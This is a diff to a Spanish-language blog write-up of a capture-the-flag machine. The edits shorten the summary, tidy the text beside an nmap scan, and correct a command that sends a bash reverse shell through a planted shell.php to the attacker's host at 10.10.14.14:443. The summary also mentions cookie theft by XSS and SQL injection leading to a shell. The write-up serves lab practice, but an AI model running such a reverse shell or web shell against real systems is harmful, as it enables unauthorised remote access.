@@ -4,7 +4,7 @@ date: '2022-02-08'
 tags: ["CTF", "Hacking", "SQLInjection", "XSS", "#Import 2022-12-20 21:06"]
 draft: false
 authors: ['default']
-summary: 'Reto CTF que consiste en escanear los puertos de una máquina y descubrir varios puertos abiertos. En el puerto 80 encontramos un formulario vulnerable a XSS, donde insertamos un script para robar cookies. Al recibir la petición, verificamos que el ataque funciona correctamente. Descubrimos que el campo de país del formulario es vulnerable a inyecciones SQL. Aprovechamos esta vulnerabilidad para obtener una shell y acceder a la configuración del sistema. Finalmente, encontramos las flags de usuario y root.'
+summary: 'Reto CTF que consiste en encontrar vulnerabilidades en una máquina virtual. Se detectan puertos abiertos y se encuentra un formulario vulnerable a XSS y una inyección SQL. Se obtiene acceso y se enumeran las flags.'
 images: ["/static/images/uploads/ctf-validation/validation.webp", "/static/images/uploads/ctf-validation/form.webp", "/static/images/uploads/ctf-validation/xss.webp"]
 ---
 
@@ -18,7 +18,7 @@ En este caso empezamos con el escaneo de puertos.
 ```
 nmap -p- -sS --open -T5 -vvv -n -Pn -oG allPorts 10.10.11.116
 ```
-NMAP all ports discoveryEn mi caso, el parámetro --min-rate 5000 no me funciona bien. Seguramente tenga algo que ver la máquina virtual que utilizo, por lo que utilizo -T5 que es el modo loco de NMAP para ir tan rápido como pueda.
+En mi caso, el parámetro --min-rate 5000 no me funciona bien. Seguramente tenga algo que ver la máquina virtual que utilizo, por lo que utilizo -T5 que es el modo loco de NMAP para ir tan rápido como pueda.
 
 Descubrimos varios puertos abiertos.
 
@@ -86,7 +86,7 @@ Me pongo en escucha con Netcat en mi máquina en el puerto 443 y realizo una pet
 ```
 http://10.10.11.116/shell.php?cmd=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.14%2F443%200%3E%261%0A
 ```
-La URL está codificada. El contenido de cmd es bash -i & /dev/tcp/10.10.14.14/443 0&1.
+La URL está codificada. El contenido de cmd es bash -i >& /dev/tcp/10.10.14.14/443 0>&1.
 
 Recibo la shell y lo primero que hago es ver la siguiente configuración en el directorio actual.
 
